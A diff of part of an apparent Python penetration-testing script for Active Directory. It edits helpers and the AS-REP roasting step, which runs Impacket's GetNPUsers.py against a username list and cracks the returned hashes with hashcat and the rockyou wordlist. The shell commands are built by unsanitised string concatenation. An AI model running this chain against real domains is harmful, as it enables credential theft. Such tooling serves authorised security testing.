@@ -140,7 +140,7 @@ def test_TSH():
       return 0
       
 def lineCount(variable):
-   localCOM("wc -l " + variable + " > count.tmp")
+   localCOM("cat " + variable + " | wc -l > count.tmp")
    count = (linecache.getline("count.tmp", 1).rstrip("\n"))
    count = extract_numbers(count)
    count = count.rstrip(" ")
@@ -535,7 +535,7 @@ def networkSweep():
    
 def catsFile(variable):
    count = lineCount(variable)
-   if count > 0:
+   if count != 0:
       localCOM("echo '" + Green + "'")
       localCOM("cat " + variable)
       localCOM("echo '" + Reset + "'")
@@ -2521,14 +2521,15 @@ while True:
                   localCOM("echo " + line + " >> authorised.tmp")
          count = lineCount("authorised.tmp")      
          if count == 0:
-            print("[+] The authorised user file seems to be empty, so I am authorising everyone in the list..")
+            print("[*] The authorised user file seems to be empty, so I am authorising everyone in the list..")
             localCOM("cp " + dataDir + "/usernames.txt authorised.tmp")
          linecache.clearcache()
          countName = lineCount("authorised.tmp")
          print("[+] Checking " + str(countName) + " usernames...")
-         remoteCOM(keyPath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp 2>&1 > temp.tmp")
+         remoteCOM(keyPath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp >> temp.tmp")
+         cutLine("[-] Kerberos SessionError","temp.tmp")
+         catsFile("temp.tmp")
          print(colored("[*] Cracking hash values if they exists...\n", colour3))
-         catsFile("hashroast2.tmp")
          localCOM("hashcat -m 18200 --force -a 0 hashroast2.tmp /usr/share/wordlists/rockyou.txt -o cracked2.tmp 2>&1 > temp.tmp")
          catsFile("cracked2.tmp")       
       prompt()
